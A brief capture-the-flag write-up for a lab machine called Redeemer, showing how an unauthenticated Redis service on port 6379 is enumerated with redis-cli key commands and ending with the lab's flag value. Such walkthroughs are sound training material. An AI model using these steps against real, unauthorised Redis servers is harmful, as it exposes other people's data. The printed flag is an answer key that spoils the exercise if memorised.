# Redeemer — Tier 0

**Concept:** Redis database enumeration without authentication to extract sensitive data.

## Recon

```
PORT     STATE SERVICE
6379/tcp open  redis
```

## Exploitation

### Step 1 — Connect to Redis

Connected to the Redis server using `redis-cli`:

```
redis-cli -h 10.129.x.x
```

### Step 2 — Enumerate Database

Checked keyspace and retrieved the flag:

```
redis> INFO keyspace
redis> SELECT 0
redis> KEYS *
redis> GET <key>
```

## Findings

| Field | Value |
|-------|-------|
| Target IP | `10.129.x.x` |
| Service | Redis (port 6379) |
| Attack Vector | Unauthenticated Redis access |
| Flag | `03e1d2b376c37ab3f5319922053953eb` |
